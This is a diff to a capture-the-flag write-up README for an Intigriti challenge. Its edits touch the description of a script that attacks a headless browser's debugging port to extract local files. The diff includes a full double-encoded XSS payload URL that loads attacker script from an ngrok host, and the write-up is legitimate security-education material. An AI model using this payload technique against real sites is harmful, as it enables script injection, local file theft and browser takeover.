@@ -67,7 +67,7 @@ Get ready for the magic! Our scripts are the key to the victory flag.
 
 ### Entrypoint - [src/page_404.js](src/page_404.js)
 
-The party starts with `page_404.js`, orchestrating the exploit dance. It cracks Puppeteer's port, initiating the auto-download of `fetcher.html` for local file extraction.
+The party starts with `page_404.js`, orchestrating the exploit dance. It quickly cracks Puppeteer's port, initiating the auto-download of `fetcher.html` for local file extraction without letting the browser close.
 
 ### Fetcher - [src/fetcher.html](src/fetcher.html)
 
@@ -90,7 +90,7 @@ This payload targets the endpoint `https://challenge-1023.intigriti.io/api/repor
 <img src='images/payload.png' alt='payload'/>
 
 ```plaintext
-https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle><script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253b404.js'><%2526%2523x2f%253bscript>">?startPort=40000
+https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle><script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253bpage_404.js'><%2526%2523x2f%253bscript>">?startPort=40000
 ```
 
 Let's break it down:
@@ -103,7 +103,7 @@ Let's break it down:
 
 I've crafted an iterative script to bring a touch of automation to the port extraction. After configuring your server (e.g. with `ngrok http 3001`), simply hit up `/solve` and the script autonomously tests various ports to pinpoint the right one.
 
-> 💡 Hint: Execute `npm i && npm start` after cloning the code to observe the script server in action.
+> 💡 Tip: Execute `npm i && npm start` after cloning the code to observe the script server in action.
 
 For an in-depth dive into the magic behind automated port-guessing, check out the code documentation.
 
